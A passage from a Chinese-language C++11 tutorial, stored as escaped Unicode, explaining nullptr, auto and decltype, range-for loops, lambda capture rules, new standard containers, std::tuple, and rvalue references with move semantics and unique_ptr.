\u5173\u952e\u5b57\uff0c\u4e13\u95e8\u7528\u6765\u533a\u5206\u7a7a\u6307\u9488\u30010\u3002 nullptr \u7684\u7c7b\u578b\u4e3a nullptr_t\uff0c\u80fd\u591f\u9690\u5f0f\u7684\u8f6c\u6362\u4e3a\u4efb\u4f55\u6307\u9488\u6216\u6210\u5458\u6307\u9488\u7684\u7c7b\u578b\uff0c\u4e5f\u80fd\u548c\u4ed6\u4eec\u8fdb\u884c\u76f8\u7b49\u6216\u8005\u4e0d\u7b49\u7684\u6bd4\u8f83\u3002\u5f53\u9700\u8981\u4f7f\u7528 NULL \u65f6\u5019\uff0c\u517b\u6210\u76f4\u63a5\u4f7f\u7528 nullptr\u7684\u4e60\u60ef\u3002 \u5728\u6ca1\u6709C++ 11\u7684nullptr\u7684\u65f6\u5019\uff0c\u6211\u4eec\u600e\u4e48\u89e3\u51b3\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a: const class nullptr_t { public: template<class T> operator T*() const { return 0; } template<class C, class T> operator T C::*() const { return 0; } private: void operator&() const; } nullptr = {}; #undef NULL #define NULL nullptr \u7c7b\u578b\u63a8\u5bfc: C++11 \u5f15\u5165\u4e86 auto \u548c decltype \u8fd9\u4e24\u4e2a\u5173\u952e\u5b57\u5b9e\u73b0\u4e86\u7c7b\u578b\u63a8\u5bfc\uff0c\u8ba9\u7f16\u8bd1\u5668\u6765\u64cd\u5fc3\u53d8\u91cf\u7684\u7c7b\u578b\u3002 auto \u5728\u5f88\u65e9\u4ee5\u524d\u5c31\u5df2\u7ecf\u8fdb\u5165\u4e86 C++\uff0c\u4f46\u662f\u4ed6\u59cb\u7ec8\u4f5c\u4e3a\u4e00\u4e2a\u5b58\u50a8\u7c7b\u578b\u7684\u6307\u793a\u7b26\u5b58\u5728\uff0c\u4e0e register \u5e76\u5b58\u3002\u5728\u4f20\u7edf C++ \u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u4e3a register \u53d8\u91cf\uff0c\u5c06\u81ea\u52a8\u88ab\u89c6\u4e3a\u4e00\u4e2a auto \u53d8\u91cf\u3002\u800c\u968f\u7740 register \u88ab\u5f03\u7528\uff0c\u5bf9 auto \u7684\u8bed\u4e49\u53d8\u66f4\u4e5f\u5c31\u975e\u5e38\u81ea\u7136\u4e86\u3002 \u4f7f\u7528 auto \u8fdb\u884c\u7c7b\u578b\u63a8\u5bfc\u7684\u4e00\u4e2a\u6700\u4e3a\u5e38\u89c1\u800c\u4e14\u663e\u8457\u7684\u4f8b\u5b50\u5c31\u662f\u8fed\u4ee3\u5668\u3002\u5728\u4ee5\u524d\u6211\u4eec\u9700\u8981\u8fd9\u6837\u6765\u4e66\u5199\u4e00\u4e2a\u8fed\u4ee3\u5668\uff1a for(vector<int>::const_iterator itr = vec.cbegin(); itr != vec.cend(); ++itr) \u800c\u6709\u4e86 auto \u4e4b\u540e\u53ef\u4ee5\uff1a for(auto itr = vec.cbegin(); itr != vec.cend(); ++itr); decltype \u5173\u952e\u5b57\u662f\u4e3a\u4e86\u89e3\u51b3 auto \u5173\u952e\u5b57\u53ea\u80fd\u5bf9\u53d8\u91cf\u8fdb\u884c\u7c7b\u578b\u63a8\u5bfc\u7684\u7f3a\u9677\u800c\u51fa\u73b0\u7684\u3002\u5b83\u7684\u7528\u6cd5\u548c sizeof \u5f88\u76f8\u4f3c\uff1adecltype(\u8868\u8fbe\u5f0f) auto x = 1; auto y = 2; decltype(x+y) z; \u57fa\u4e8e\u8303\u56f4\u7684 for \u5faa\u73af C++11 \u5f15\u5165\u4e86\u57fa\u4e8e\u8303\u56f4\u7684\u8fed\u4ee3\u5199\u6cd5\uff0c\u6211\u4eec\u62e5\u6709\u4e86\u80fd\u591f\u5199\u51fa\u50cf Python \u4e00\u6837\u7b80\u6d01\u7684\u5faa\u73af\u8bed\u53e5\u3002 \u6700\u5e38\u7528\u7684 std::vector \u904d\u5386\u5c06\u4ece\u539f\u6765\u7684\u6837\u5b50\uff1a for(std::vector<int>::iterator i = arr.begin(); i != arr.end(); ++i) { std::cout << *i << std::endl; } \u4f7f\u7528\u8303\u56f4for\u5faa\u73af\u53d8\u5f97\u975e\u5e38\u7684\u7b80\u5355\uff1a // & \u542f\u7528\u4e86\u5f15\u7528 for(auto &i : arr) { std::cout << i << std::endl; } \u521d\u59cb\u5316\u5217\u8868 C++11 \u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u8bed\u6cd5\u6765\u521d\u59cb\u5316\u4efb\u610f\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a struct A { int a; float b; }; struct B { B(int _a, float _b): a(_a), b(_b) {} private: int a; float b; }; A a {1, 1.1}; // \u7edf\u4e00\u7684\u521d\u59cb\u5316\u8bed\u6cd5 B b {2, 2.2}; Lambda \u8868\u8fbe\u5f0f Lambda \u8868\u8fbe\u5f0f\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u533f\u540d\u51fd\u6570\u7684\u7279\u6027\uff0c\u800c\u533f\u540d\u51fd\u6570\u5219\u662f\u5728\u9700\u8981\u4e00\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u53c8\u4e0d\u60f3\u8d39\u529b\u53bb\u547d\u540d\u4e00\u4e2a\u51fd\u6570\u7684\u60c5\u51b5\u4e0b\u53bb\u4f7f\u7528\u7684\u3002\u57fa\u672c\u8bed\u6cd5\u5982\u4e0b\uff1a [ caputrue ] ( params ) opt -> ret { body; }; capture\u662f\u6355\u83b7\u5217\u8868\uff1b params\u662f\u53c2\u6570\u8868\uff1b(\u9009\u586b) opt\u662f\u51fd\u6570\u9009\u9879\uff1b\u53ef\u4ee5\u586bmutable,exception,attribute\uff08\u9009\u586b\uff09 mutable\u8bf4\u660elambda\u8868\u8fbe\u5f0f\u4f53\u5185\u7684\u4ee3\u7801\u53ef\u4ee5\u4fee\u6539\u88ab\u6355\u83b7\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u53ef\u4ee5\u8bbf\u95ee\u88ab\u6355\u83b7\u7684\u5bf9\u8c61\u7684non-const\u65b9\u6cd5\u3002 exception\u8bf4\u660elambda\u8868\u8fbe\u5f0f\u662f\u5426\u629b\u51fa\u5f02\u5e38\u4ee5\u53ca\u4f55\u79cd\u5f02\u5e38\u3002 attribute\u7528\u6765\u58f0\u660e\u5c5e\u6027\u3002 ret\u662f\u8fd4\u56de\u503c\u7c7b\u578b\uff08\u62d6\u5c3e\u8fd4\u56de\u7c7b\u578b\uff09\u3002(\u9009\u586b) body\u662f\u51fd\u6570\u4f53\u3002 \u6355\u83b7\u5217\u8868\uff1alambda\u8868\u8fbe\u5f0f\u7684\u6355\u83b7\u5217\u8868\u7cbe\u7ec6\u63a7\u5236\u4e86lambda\u8868\u8fbe\u5f0f\u80fd\u591f\u8bbf\u95ee\u7684\u5916\u90e8\u53d8\u91cf\uff0c\u4ee5\u53ca\u5982\u4f55\u8bbf\u95ee\u8fd9\u4e9b\u53d8\u91cf\u3002 []\u4e0d\u6355\u83b7\u4efb\u4f55\u53d8\u91cf\u3002 [&]\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u4f5c\u4e3a\u5f15\u7528\u5728\u51fd\u6570\u4f53\u4e2d\u4f7f\u7528\uff08\u6309\u5f15\u7528\u6355\u83b7\uff09\u3002 [=]\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u4f5c\u4e3a\u526f\u672c\u5728\u51fd\u6570\u4f53\u4e2d\u4f7f\u7528(\u6309\u503c\u6355\u83b7)\u3002\u6ce8\u610f\u503c\u6355\u83b7\u7684\u524d\u63d0\u662f\u53d8\u91cf\u53ef\u4ee5\u62f7\u8d1d\uff0c\u4e14\u88ab\u6355\u83b7\u7684\u53d8\u91cf\u5728 lambda \u8868\u8fbe\u5f0f\u88ab\u521b\u5efa\u65f6\u62f7\u8d1d\uff0c\u800c\u975e\u8c03\u7528\u65f6\u624d\u62f7\u8d1d\u3002\u5982\u679c\u5e0c\u671blambda\u8868\u8fbe\u5f0f\u5728\u8c03\u7528\u65f6\u80fd\u5373\u65f6\u8bbf\u95ee\u5916\u90e8\u53d8\u91cf\uff0c\u6211\u4eec\u5e94\u5f53\u4f7f\u7528\u5f15\u7528\u65b9\u5f0f\u6355\u83b7\u3002 int a = 0; auto f = [=] { return a; }; a+=1; cout << f() << endl; //\u8f93\u51fa0 int a = 0; auto f = [&a] { return a; }; a+=1; cout << f() <<endl; //\u8f93\u51fa1 [=,&foo]\u6309\u503c\u6355\u83b7\u5916\u90e8\u4f5c\u7528\u57df\u4e2d\u6240\u6709\u53d8\u91cf\uff0c\u5e76\u6309\u5f15\u7528\u6355\u83b7foo\u53d8\u91cf\u3002 [bar]\u6309\u503c\u6355\u83b7bar\u53d8\u91cf\uff0c\u540c\u65f6\u4e0d\u6355\u83b7\u5176\u4ed6\u53d8\u91cf\u3002 [this]\u6355\u83b7\u5f53\u524d\u7c7b\u4e2d\u7684this\u6307\u9488\uff0c\u8ba9lambda\u8868\u8fbe\u5f0f\u62e5\u6709\u548c\u5f53\u524d\u7c7b\u6210\u5458\u51fd\u6570\u540c\u6837\u7684\u8bbf\u95ee\u6743\u9650\u3002\u5982\u679c\u5df2\u7ecf\u4f7f\u7528\u4e86&\u6216\u8005=\uff0c\u5c31\u9ed8\u8ba4\u6dfb\u52a0\u6b64\u9009\u9879\u3002\u6355\u83b7this\u7684\u76ee\u7684\u662f\u53ef\u4ee5\u5728lamda\u4e2d\u4f7f\u7528\u5f53\u524d\u7c7b\u7684\u6210\u5458\u51fd\u6570\u548c\u6210\u5458\u53d8\u91cf\u3002 class A { public: int i_ = 0; void func(int x,int y){ auto x1 = [] { return i_; }; //error,\u6ca1\u6709\u6355\u83b7\u5916\u90e8\u53d8\u91cf auto x2 = [=] { return i_ + x + y; }; //OK auto x3 = [&] { return i_ + x + y; }; //OK auto x4 = [this] { return i_; }; //OK auto x5 = [this] { return i_ + x + y; }; //error,\u6ca1\u6709\u6355\u83b7x,y auto x6 = [this, x, y] { return i_ + x + y; }; //OK auto x7 = [this] { return i_++; }; //OK } }; int a=0 , b=1; auto f1 = [] { return a; }; //error,\u6ca1\u6709\u6355\u83b7\u5916\u90e8\u53d8\u91cf auto f2 = [&] { return a++ }; //OK auto f3 = [=] { return a; }; //OK auto f4 = [=] {return a++; }; //error,a\u662f\u4ee5\u590d\u5236\u65b9\u5f0f\u6355\u83b7\u7684\uff0c\u65e0\u6cd5\u4fee\u6539 auto f5 = [a] { return a+b; }; //error,\u6ca1\u6709\u6355\u83b7\u53d8\u91cfb auto f6 = [a, &b] { return a + (b++); }; //OK auto f7 = [=, &b] { return a + (b++); }; //OK \u6ce8\u610ff4\uff0c\u867d\u7136\u6309\u503c\u6355\u83b7\u7684\u53d8\u91cf\u503c\u5747\u590d\u5236\u4e00\u4efd\u5b58\u50a8\u5728lambda\u8868\u8fbe\u5f0f\u53d8\u91cf\u4e2d\uff0c\u4fee\u6539\u4ed6\u4eec\u4e5f\u5e76\u4e0d\u4f1a\u771f\u6b63\u5f71\u54cd\u5230\u5916\u90e8\uff0c\u4f46\u6211\u4eec\u5374\u4ecd\u7136\u65e0\u6cd5\u4fee\u6539\u5b83\u4eec\u3002\u5982\u679c\u5e0c\u671b\u53bb\u4fee\u6539\u6309\u503c\u6355\u83b7\u7684\u5916\u90e8\u53d8\u91cf\uff0c\u9700\u8981\u663e\u793a\u6307\u660elambda\u8868\u8fbe\u5f0f\u4e3amutable\u3002\u88abmutable\u4fee\u9970\u7684lambda\u8868\u8fbe\u5f0f\u5c31\u7b97\u6ca1\u6709\u53c2\u6570\u4e5f\u8981\u5199\u660e\u53c2\u6570\u5217\u8868\u3002 \u539f\u56e0\uff1alambda\u8868\u8fbe\u5f0f\u53ef\u4ee5\u8bf4\u662f\u5c31\u5730\u5b9a\u4e49\u4eff\u51fd\u6570\u95ed\u5305\u7684\u201c\u8bed\u6cd5\u7cd6\u201d\u3002\u5b83\u7684\u6355\u83b7\u5217\u8868\u6355\u83b7\u4f4f\u7684\u4efb\u4f55\u5916\u90e8\u53d8\u91cf\uff0c\u6700\u7ec8\u4f1a\u53d8\u4e3a\u95ed\u5305\u7c7b\u578b\u7684\u6210\u5458\u53d8\u91cf\u3002\u6309\u7167C++\u6807\u51c6\uff0clambda\u8868\u8fbe\u5f0f\u7684operator()\u9ed8\u8ba4\u662fconst\u7684\uff0c\u4e00\u4e2aconst\u6210\u5458\u51fd\u6570\u662f\u65e0\u6cd5\u4fee\u6539\u6210\u5458\u53d8\u91cf\u7684\u503c\u7684\u3002\u800cmutable\u7684\u4f5c\u7528\uff0c\u5c31\u5728\u4e8e\u53d6\u6d88operator()\u7684const\u3002 int a = 0; auto f1 = [=] { return a++; }; //error auto f2 = [=] () mutable { return a++; }; //OK lambda\u8868\u8fbe\u5f0f\u7684\u5927\u81f4\u539f\u7406\uff1a\u6bcf\u5f53\u4f60\u5b9a\u4e49\u4e00\u4e2alambda\u8868\u8fbe\u5f0f\u540e\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u751f\u6210\u4e00\u4e2a\u533f\u540d\u7c7b\uff08\u8fd9\u4e2a\u7c7b\u91cd\u8f7d\u4e86()\u8fd0\u7b97\u7b26\uff09\uff0c\u6211\u4eec\u79f0\u4e3a\u95ed\u5305\u7c7b\u578b\uff08closure type\uff09\u3002\u90a3\u4e48\u5728\u8fd0\u884c\u65f6\uff0c\u8fd9\u4e2alambda\u8868\u8fbe\u5f0f\u5c31\u4f1a\u8fd4\u56de\u4e00\u4e2a\u533f\u540d\u7684\u95ed\u5305\u5b9e\u4f8b\uff0c\u662f\u4e00\u4e2a\u53f3\u503c\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u4e0a\u9762\u7684lambda\u8868\u8fbe\u5f0f\u7684\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u4e2a\u95ed\u5305\u3002\u5bf9\u4e8e\u590d\u5236\u4f20\u503c\u6355\u6349\u65b9\u5f0f\uff0c\u7c7b\u4e2d\u4f1a\u76f8\u5e94\u6dfb\u52a0\u5bf9\u5e94\u7c7b\u578b\u7684\u975e\u9759\u6001\u6570\u636e\u6210\u5458\u3002\u5728\u8fd0\u884c\u65f6\uff0c\u4f1a\u7528\u590d\u5236\u7684\u503c\u521d\u59cb\u5316\u8fd9\u4e9b\u6210\u5458\u53d8\u91cf\uff0c\u4ece\u800c\u751f\u6210\u95ed\u5305\u3002\u5bf9\u4e8e\u5f15\u7528\u6355\u83b7\u65b9\u5f0f\uff0c\u65e0\u8bba\u662f\u5426\u6807\u8bb0mutable\uff0c\u90fd\u53ef\u4ee5\u5728lambda\u8868\u8fbe\u5f0f\u4e2d\u4fee\u6539\u6355\u83b7\u7684\u503c\u3002\u81f3\u4e8e\u95ed\u5305\u7c7b\u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u6210\u5458\uff0cC++\u6807\u51c6\u4e2d\u7ed9\u51fa\u7684\u7b54\u6848\u662f\uff1a\u4e0d\u6e05\u695a\u7684\uff0c\u4e0e\u5177\u4f53\u5b9e\u73b0\u6709\u5173\u3002 \u65b0\u589e\u5bb9\u5668 std::array \u4fdd\u5b58\u5728\u6808\u5185\u5b58\u4e2d\uff0c\u76f8\u6bd4\u5806\u5185\u5b58\u4e2d\u7684 std::vector\uff0c\u6211\u4eec\u80fd\u591f\u7075\u6d3b\u7684\u8bbf\u95ee\u8fd9\u91cc\u9762\u7684\u5143\u7d20\uff0c\u4ece\u800c\u83b7\u5f97\u66f4\u9ad8\u7684\u6027\u80fd\u3002std::array \u4f1a\u5728\u7f16\u8bd1\u65f6\u521b\u5efa\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u7ec4\uff0cstd::array \u4e0d\u80fd\u591f\u88ab\u9690\u5f0f\u7684\u8f6c\u6362\u6210\u6307\u9488\uff0c\u4f7f\u7528 std::array\u53ea\u9700\u6307\u5b9a\u5176\u7c7b\u578b\u548c\u5927\u5c0f\u5373\u53ef\uff1a std::array<int, 4> arr= {1,2,3,4}; int len = 4; std::array<int, len> arr = {1,2,3,4}; // \u975e\u6cd5, \u6570\u7ec4\u5927\u5c0f\u53c2\u6570\u5fc5\u987b\u662f\u5e38\u91cf\u8868\u8fbe\u5f0f std::forward_list \u662f\u4e00\u4e2a\u5217\u8868\u5bb9\u5668\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c std::list \u57fa\u672c\u7c7b\u4f3c\u3002 \u548c std::list \u7684\u53cc\u5411\u94fe\u8868\u7684\u5b9e\u73b0\u4e0d\u540c\uff0cstd::forward_list \u4f7f\u7528\u5355\u5411\u94fe\u8868\u8fdb\u884c\u5b9e\u73b0\uff0c\u63d0\u4f9b\u4e86 O(1) \u590d\u6742\u5ea6\u7684\u5143\u7d20\u63d2\u5165\uff0c\u4e0d\u652f\u6301\u5feb\u901f\u968f\u673a\u8bbf\u95ee\uff08\u8fd9\u4e5f\u662f\u94fe\u8868\u7684\u7279\u70b9\uff09\uff0c\u4e5f\u662f\u6807\u51c6\u5e93\u5bb9\u5668\u4e2d\u552f\u4e00\u4e00\u4e2a\u4e0d\u63d0\u4f9b size() \u65b9\u6cd5\u7684\u5bb9\u5668\u3002\u5f53\u4e0d\u9700\u8981\u53cc\u5411\u8fed\u4ee3\u65f6\uff0c\u5177\u6709\u6bd4 std::list \u66f4\u9ad8\u7684\u7a7a\u95f4\u5229\u7528\u7387\u3002 C++11 \u5f15\u5165\u4e86\u4e24\u7ec4\u65e0\u5e8f\u5bb9\u5668\uff1a std::unordered_map/std::unordered_multimap \u548c std::unordered_set/std::unordered_multiset\u3002 \u65e0\u5e8f\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u662f\u4e0d\u8fdb\u884c\u6392\u5e8f\u7684\uff0c\u5185\u90e8\u901a\u8fc7 Hash \u8868\u5b9e\u73b0\uff0c\u63d2\u5165\u548c\u641c\u7d22\u5143\u7d20\u7684\u5e73\u5747\u590d\u6742\u5ea6\u4e3a O(constant)\u3002 \u5143\u7ec4 std::tuple \u5143\u7ec4\u7684\u4f7f\u7528\u6709\u4e09\u4e2a\u6838\u5fc3\u7684\u51fd\u6570\uff1a std::make_tuple: \u6784\u9020\u5143\u7ec4 std::get: \u83b7\u5f97\u5143\u7ec4\u67d0\u4e2a\u4f4d\u7f6e\u7684\u503c std::tie: \u5143\u7ec4\u62c6\u5305 \u5143\u7ec4\u793a\u4f8b\uff1a #include <tuple> #include <iostream> auto get_student(int id) { // \u8fd4\u56de\u7c7b\u578b\u88ab\u63a8\u65ad\u4e3a std::tuple<double, char, std::string> if (id == 0) return std::make_tuple(3.8, 'A', \"\u5f20\u4e09\"); if (id == 1) return std::make_tuple(2.9, 'C', \"\u674e\u56db\"); if (id == 2) return std::make_tuple(1.7, 'D', \"\u738b\u4e94\"); return std::make_tuple(0.0, 'D', \"null\"); // \u5982\u679c\u53ea\u5199 0 \u4f1a\u51fa\u73b0\u63a8\u65ad\u9519\u8bef, \u7f16\u8bd1\u5931\u8d25 } int main() { auto student = get_student(0); std::cout << \"ID: 0, \" << \"GPA: \" << std::get<0>(student) << \", \" << \"\u6210\u7ee9: \" << std::get<1>(student) << \", \" << \"\u59d3\u540d: \" << std::get<2>(student) << '\\n'; double gpa; char grade; std::string name; // \u5143\u7ec4\u8fdb\u884c\u62c6\u5305 std::tie(gpa, grade, name) = get_student(1); std::cout << \"ID: 1, \" << \"GPA: \" << gpa << \", \" << \"\u6210\u7ee9: \" << grade << \", \" << \"\u59d3\u540d: \" << name << '\\n'; } \u6b63\u5219\u8868\u8fbe\u5f0f \u6b63\u5219\u8868\u8fbe\u5f0f\u63cf\u8ff0\u4e86\u4e00\u79cd\u5b57\u7b26\u4e32\u5339\u914d\u7684\u6a21\u5f0f\u3002\u4e00\u822c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3b\u8981\u662f\u5b9e\u73b0\u4e0b\u9762\u4e09\u4e2a\u9700\u6c42\uff1a \u68c0\u67e5\u4e00\u4e2a\u4e32\u662f\u5426\u5305\u542b\u67d0\u79cd\u5f62\u5f0f\u7684\u5b50\u4e32\uff1b \u5c06\u5339\u914d\u7684\u5b50\u4e32\u66ff\u6362\uff1b \u4ece\u67d0\u4e2a\u4e32\u4e2d\u53d6\u51fa\u7b26\u5408\u6761\u4ef6\u7684\u5b50\u4e32\u3002 C++11 \u63d0\u4f9b\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5e93\u64cd\u4f5c std::string \u5bf9\u8c61\uff0c\u5bf9\u6a21\u5f0f std::regex (\u672c\u8d28\u662f std::basic_regex)\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u901a\u8fc7 std::regex_match \u8fdb\u884c\u5339\u914d\uff0c\u4ece\u800c\u4ea7\u751f std::smatch \uff08\u672c\u8d28\u662f std::match_results \u5bf9\u8c61\uff09\u3002 \u8bed\u8a00\u7ea7\u7ebf\u7a0b\u652f\u6301 std::thread std::mutex/std::unique_lock std::future/std::packaged_task std::condition_variable \u4ee3\u7801\u7f16\u8bd1\u9700\u8981\u4f7f\u7528 -pthread \u9009\u9879 \u53f3\u503c\u5f15\u7528\u548cmove\u8bed\u4e49 C++ 11\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u673a\u5236\u53eb\u505a\u201c\u53f3\u503c\u5f15\u7528\u201d\uff0c\u4ee5\u4fbf\u6211\u4eec\u901a\u8fc7\u91cd\u8f7d\u76f4\u63a5\u4f7f\u7528\u53f3\u503c\u53c2\u6570\u3002\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u5199\u4e00\u4e2a\u4ee5\u53f3\u503c\u5f15\u7528\u4e3a\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\uff1a string(string&& that) // string&& is an rvalue reference to a string { data = that.data; that.data = 0; } \u6211\u4eec\u6ca1\u6709\u6df1\u5ea6\u62f7\u8d1d\u5806\u5185\u5b58\u4e2d\u7684\u6570\u636e\uff0c\u800c\u662f\u4ec5\u4ec5\u590d\u5236\u4e86\u6307\u9488\uff0c\u5e76\u628a\u6e90\u5bf9\u8c61\u7684\u6307\u9488\u7f6e\u7a7a\u3002\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u201c\u5077\u53d6\u201d\u4e86\u5c5e\u4e8e\u6e90\u5bf9\u8c61\u7684\u5185\u5b58\u6570\u636e\u3002\u7531\u4e8e\u6e90\u5bf9\u8c61\u662f\u4e00\u4e2a\u53f3\u503c\uff0c\u4e0d\u4f1a\u518d\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64\u5ba2\u6237\u5e76\u4e0d\u4f1a\u89c9\u5bdf\u5230\u6e90\u5bf9\u8c61\u88ab\u6539\u53d8\u4e86\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u771f\u6b63\u7684\u590d\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u53eb\u505a\u201c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u201d\uff08move constructor\uff09\uff0c\u4ed6\u7684\u5de5\u4f5c\u5c31\u662f\u628a\u8d44\u6e90\u4ece\u4e00\u4e2a\u5bf9\u8c61\u8f6c\u79fb\u5230\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u590d\u5236\u4ed6\u4eec\u3002 \u5bf9\u4e8eC++ 11\uff0c\u7f16\u8bd1\u5668\u4f1a\u4f9d\u636e\u53c2\u6570\u662f\u5de6\u503c\u8fd8\u662f\u53f3\u503c\u5728\u590d\u5236\u6784\u9020\u51fd\u6570\u548c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u95f4\u8fdb\u884c\u9009\u62e9\u3002 \u5982\u679c\u662fa=b\uff0c\u8fd9\u6837\u5c31\u4f1a\u8c03\u7528\u590d\u5236\u6784\u9020\u51fd\u6570\u6765\u521d\u59cb\u5316that\uff08\u56e0\u4e3ab\u662f\u5de6\u503c\uff09\uff0c\u8d4b\u503c\u64cd\u4f5c\u7b26\u4f1a\u4e0e\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4ea4\u6362\u6570\u636e\uff0c\u6df1\u5ea6\u62f7\u8d1d\u3002\u8fd9\u5c31\u662fcopy and swap \u60ef\u7528\u6cd5\u7684\u5b9a\u4e49\uff1a\u6784\u9020\u4e00\u4e2a\u526f\u672c\uff0c\u4e0e\u526f\u672c\u4ea4\u6362\u6570\u636e\uff0c\u5e76\u8ba9\u526f\u672c\u5728\u4f5c\u7528\u57df\u5185\u81ea\u52a8\u9500\u6bc1\u3002\u8fd9\u91cc\u4e5f\u4e00\u6837\u3002 \u5982\u679c\u662fa = x + y\uff0c\u8fd9\u6837\u5c31\u4f1a\u8c03\u7528\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u6765\u521d\u59cb\u5316that\uff08\u56e0\u4e3ax+y\u662f\u53f3\u503c\uff09\uff0c\u6240\u4ee5\u8fd9\u91cc\u6ca1\u6709\u6df1\u5ea6\u62f7\u8d1d\uff0c\u53ea\u6709\u9ad8\u6548\u7684\u6570\u636e\u8f6c\u79fb\u3002\u76f8\u5bf9\u4e8e\u53c2\u6570\uff0cthat\u4f9d\u7136\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u4ed6\u7684\u6784\u9020\u51fd\u6570\u662f\u65e0\u7528\u7684\uff08trivial\uff09\uff0c\u56e0\u6b64\u5806\u4e2d\u7684\u6570\u636e\u6ca1\u6709\u5fc5\u8981\u590d\u5236\uff0c\u800c\u4ec5\u4ec5\u662f\u8f6c\u79fb\u3002\u6ca1\u6709\u5fc5\u8981\u590d\u5236\u4ed6\uff0c\u56e0\u4e3ax+y\u662f\u53f3\u503c\uff0c\u518d\u6b21\uff0c\u4ece\u53f3\u503c\u6307\u5411\u7684\u5bf9\u8c61\u4e2d\u8f6c\u79fb\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff1a\u590d\u5236\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u662f\u6df1\u5ea6\u62f7\u8d1d\uff0c\u56e0\u4e3a\u6e90\u5bf9\u8c61\u672c\u8eab\u5fc5\u987b\u4e0d\u80fd\u88ab\u6539\u53d8\u3002\u800c\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u5374\u53ef\u4ee5\u590d\u5236\u6307\u9488\uff0c\u628a\u6e90\u5bf9\u8c61\u7684\u6307\u9488\u7f6e\u7a7a\uff0c\u8fd9\u79cd\u5f62\u5f0f\u4e0b\uff0c\u8fd9\u662f\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u7528\u6237\u4e0d\u53ef\u80fd\u518d\u4f7f\u7528\u8fd9\u4e2a\u5bf9\u8c61\u4e86\u3002 \u53f3\u503c\u5f15\u7528\u662f\u9488\u5bf9\u53f3\u503c\u7684\u65b0\u7684\u5f15\u7528\u7c7b\u578b\uff0c\u8bed\u6cd5\u662fX&&\u3002\u4ee5\u524d\u7684\u8001\u7684\u5f15\u7528\u7c7b\u578bX& \u73b0\u5728\u88ab\u79f0\u4f5c\u5de6\u503c\u5f15\u7528\u3002\u4f7f\u7528\u53f3\u503c\u5f15\u7528X&&\u4f5c\u4e3a\u53c2\u6570\u7684\u6700\u6709\u7528\u7684\u51fd\u6570\u4e4b\u4e00\u5c31\u662f\u8f6c\u79fb\u6784\u9020\u51fd\u6570X::X(X&& source)\uff0c\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u628a\u6e90\u5bf9\u8c61\u7684\u672c\u5730\u8d44\u6e90\u8f6c\u79fb\u7ed9\u5f53\u524d\u5bf9\u8c61\u3002 C++98\u6807\u51c6\u5e93\u4e2d\u63d0\u4f9b\u4e86\u4e00\u79cd\u552f\u4e00\u62e5\u6709\u6027\u7684\u667a\u80fd\u6307\u9488std::auto_ptr\uff0c\u8be5\u7c7b\u578b\u5728C++11\u4e2d\u5df2\u88ab\u5e9f\u5f03\uff0c\u56e0\u4e3a\u5176\u201c\u590d\u5236\u201d\u884c\u4e3a\u662f\u5371\u9669\u7684\u3002C++ 11\u4e2d\uff0cstd::auto_ptr< T >\u5df2\u7ecf\u88abstd::unique_ptr< T >\u6240\u53d6\u4ee3\uff0c\u540e\u8005\u5c31\u662f\u5229\u7528\u7684\u53f3\u503c\u5f15\u7528\u3002\u5176\u8f6c\u79fb\u6784\u9020\u51fd\u6570\uff1a unique_ptr(unique_ptr&& source) // note the rvalue reference { ptr = source.ptr; source.ptr = nullptr; } \u8fd9\u4e2a\u8f6c\u79fb\u6784\u9020\u51fd\u6570\u8ddfauto_ptr\u4e2d\u590d\u5236\u6784\u9020\u51fd\u6570\u505a\u7684\u4e8b\u60c5\u4e00\u6837\uff0c\u4f46\u662f\u5b83\u5374\u53ea\u80fd\u63a5\u53d7\u53f3\u503c\u4f5c\u4e3a\u53c2\u6570\u3002 unique_ptr<Shape> a(new Triangle); unique_ptr<Shape> b(a); // error unique_ptr<Shape> c(make_triangle()); // okay 